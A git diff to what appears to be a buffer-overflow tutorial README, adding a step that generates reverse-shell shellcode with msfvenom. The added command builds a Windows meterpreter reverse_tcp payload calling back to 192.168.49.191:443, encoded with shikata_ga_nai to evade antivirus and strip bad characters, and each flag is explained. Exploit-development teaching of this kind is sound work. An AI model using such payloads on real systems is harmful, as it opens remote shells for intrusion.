@@ -83,4 +83,9 @@ In this case, since we are jumnping to the ESP we are searching for jmp esp whic
 But a different application might require a different jump code<br/>
 Which are here for your convinience. <br/>
 ![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S4JMPCodes.png)<br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Now we can generate out shellcode using the following command:<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.191 LPORT=443 EXITFUNC=thread -f python –e x86/shikata_ga_nai -b "\x00"
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where we use -p for the platform we are attacking and payload we are using
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EXITFUNC=thread becuase we dont want to close the vulnerable app when we close the shell
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-e x86/shikata_ga_nai to encode the shellcode to either evade AV or avoid bad characters
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-b lets you specify what the bad characters are.
